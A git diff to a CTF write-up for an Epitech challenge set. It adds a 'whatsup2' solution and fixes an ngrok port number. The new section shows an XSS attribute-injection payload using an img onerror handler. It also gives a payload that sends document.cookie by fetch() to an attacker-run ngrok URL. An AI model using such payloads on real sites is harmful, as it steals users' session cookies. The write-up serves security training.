@@ -19,6 +19,7 @@ CTF made for Epitech by Alexis AURIAC, Victor THOMAS
 - [ssti3](#ssti3)
 - [ssti4](#ssti4)
 - [whatsup](#whatsup)
+- [whatsup2](#whatsup2)
 - [xxe1](#xxe1)
 - [confessions](#confessions)
 
@@ -749,7 +750,7 @@ $ socat TCP-LISTEN:9000,fork stdout
 
 Then to make it available online we can use [ngrok](https://ngrok.com/):
 ```bash
-$ ngrok http 900
+$ ngrok http 9000
 
 Session Status                online                                                                                
 Account                       User (Plan: Free)                                                                   
@@ -809,6 +810,41 @@ flag=BFS{XSS_M0R3_L!K3_FR33_C00K!35}
 ```
 
 flag: ```BFS{XSS_M0R3_L!K3_FR33_C00K!35}```
+
+# whatsup2
+
+## What is it
+
+Same as whatsup, except we can also send an image.
+
+The method used in whatsup doesn't work, the html is not interpreted.
+
+## Solution
+
+The way the image link is inserted in the element looks probably something like this:
+```js
+'<img src="' + input + '">'
+```
+
+We can put '"' in our input to change other properties.
+
+We can execute code by putting a bad link and putting code in ```src/onerror``` ([source](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onerror))
+
+Input:
+```
+abc" src/onerror="alert(1)
+```
+Result html:
+```html
+<img src="abc" src/onerror="alert(1)">
+```
+
+We can then use the same method we used in whatsup to get the cookie:
+```
+abc" src/onerror="fetch('https://7f09-163-5-23-68.eu.ngrok.io', {method: 'post', body: document.cookie})
+```
+
+flag: ```BFS{4n_1m4g3_79_w0r7h_a_7h0u54nd_w0rd5}```
 
 # xxe1
 
